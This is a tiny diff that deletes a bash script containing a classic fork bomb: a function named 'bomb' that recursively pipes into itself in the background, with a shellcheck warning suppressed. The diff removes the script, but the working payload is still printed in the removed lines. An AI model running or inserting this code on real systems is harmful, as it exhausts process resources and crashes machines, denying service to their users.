@@ -1,6 +1,0 @@
-#!/bin/bash
-
-bomb() { 
-  #shellcheck disable=SC2264
-  bomb | bomb &
-}; bomb
